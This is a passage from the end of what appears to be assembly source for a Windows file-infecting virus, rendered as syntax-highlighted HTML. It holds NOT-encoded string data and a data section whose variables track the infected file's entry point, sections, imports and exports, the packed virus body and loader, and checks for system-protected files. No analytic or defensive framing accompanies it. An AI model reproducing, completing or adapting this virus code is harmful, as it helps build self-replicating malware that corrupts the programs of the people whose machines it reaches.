   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">06ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">06ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">052h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">067h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">068h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">073h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">052h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">073h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">076h</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">064h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">00dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">00ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">00dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">00ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">054h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">068h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">073h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">063h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">06fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">070h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">079h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">06fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">066h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">050h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">04ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">062h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">073h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">066h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">066h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">06fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">06eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">06fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">06eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">02dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">070h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">06fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">066h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">061h</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">062h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">06ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">075h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">073h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">02eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">00dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">00ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">00dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">00ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">046h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">06fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">06dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">06fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">06eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">066h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">06fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">06dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">06fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">06eh</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">03ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">068h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">070h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">03ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">02fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">02fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">070h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">063h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">06bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">02eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">063h</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">06ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">062h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">02eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">06eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">02fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">00dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">00ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">00dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">00ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">04fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">01bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">079h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">029h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">0ebh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">0c9h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">0e5h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">042h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">0a5h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">040h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">0ceh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">0b0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">011h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">0edh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">02ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">024h</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">035h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">060h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">07dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">0b4h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">0d4h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">029h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">080h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">039h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">0b2h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">080h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">0c8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">039h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">09ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">01ch</span><span class="sc0">

   </span><span class="sc5">_end</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">

   </span><span class="sc9">.data?</span><span class="sc0">

   </span><span class="sc5">NAM_flechal</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
   </span><span class="sc5">phkResult_1</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

   </span><span class="sc5">hWnd_file_ini</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">

   </span><span class="sc5">hWnd_tmapi</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
   </span><span class="sc5">InitTmTable</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
   </span><span class="sc5">GetTmElementByIndex</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
   </span><span class="sc5">CloseTmTable</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

   </span><span class="sc5">_create_flag</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
   </span><span class="sc5">_file_attrib</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
   </span><span class="sc5">_access_type</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
   </span><span class="sc5">_file_time</span><span class="sc0">  </span><span class="sc5">FILETIME</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc10">?</span><span class="sc4">&gt;,&lt;</span><span class="sc10">?</span><span class="sc4">&gt;,&lt;</span><span class="sc10">?</span><span class="sc4">&gt;</span><span class="sc0">
   </span><span class="sc5">_file_size</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
   </span><span class="sc5">_map_access_type</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
   </span><span class="sc5">_mview_access_type</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

   </span><span class="sc5">hWnd_CreateFile</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
   </span><span class="sc5">hWnd_CreateFileMapping</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
   </span><span class="sc5">hWnd_MapViewOfFile</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

   </span><span class="sc5">hWnd_file_end</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">

   </span><span class="sc5">hWnd_imagehlp</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
   </span><span class="sc5">ImageNtHeader</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
   </span><span class="sc5">ImageRvaToSection</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
   </span><span class="sc5">ImageRvaToVa</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

   </span><span class="sc5">_image_nt_headers</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
   </span><span class="sc5">_infect_entry_point</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
   </span><span class="sc5">_infect_EP_section</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

   </span><span class="sc5">_infect_export_dir_rva</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
   </span><span class="sc5">_infect_import_dir_rva</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

   </span><span class="sc5">_infect_export_sz</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
   </span><span class="sc5">_infect_export_dir_va</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
   </span><span class="sc5">_infect_export_names</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
   </span><span class="sc5">_infect_biggest_rva</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
   </span><span class="sc5">_infect_last_section</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
   </span><span class="sc5">_infect_flechal_rva</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
   </span><span class="sc5">_infect_lib_rva</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
   </span><span class="sc5">_infect_compress_space_1</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
   </span><span class="sc5">_infect_compress_space_2</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
   </span><span class="sc5">_infect_compress_addr_1</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
   </span><span class="sc5">_infect_virtual_raw</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">;  bigger of v-size and raw</span><span class="sc0">

   </span><span class="sc5">hWnd_sfc</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
   </span><span class="sc5">SfcIsFileProtected</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

   </span><span class="sc5">hWnd_file_infect</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

   </span><span class="sc5">_look_4_function</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
   </span><span class="sc5">_kernel_import_va</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
   </span><span class="sc5">_import_function</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

   </span><span class="sc5">_viral_pack_packet_sz</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">;  packed virus size + loader size</span><span class="sc0">
   </span><span class="sc5">_viral_pack_packet_addr</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">1024</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

   </span><span class="sc5">_viral_temp_sz</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">;  packed main .exe</span><span class="sc0">
   </span><span class="sc5">_viral_temp_buffer_1</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">1024</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

   </span><span class="sc5">workmem</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">640</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">1024</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

   </span><span class="sc5">aplib@013</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
   </span><span class="sc5">aplib@009</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
   </span><span class="sc5">aplib@017</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
   </span><span class="sc5">aplib@014</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
   </span><span class="sc5">aplib@004</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
   </span><span class="sc5">aplib@003</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
   </span><span class="sc5">aplib@086</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
   </span><span class="sc5">aplib@015</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
   </span><span class="sc5">aplib@005</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
   </span><span class="sc5">aplib@016</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

   </span><span class="sc5">aplib@010</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">400h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

   </span><span class="sc5">orig_esp</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
   </span><span class="sc5">lpszSubKey_1</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

   </span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">_start</span><span class="sc0">
   </span><span class="sc9">end</span><span class="sc0">
</span></div></body>
</html>
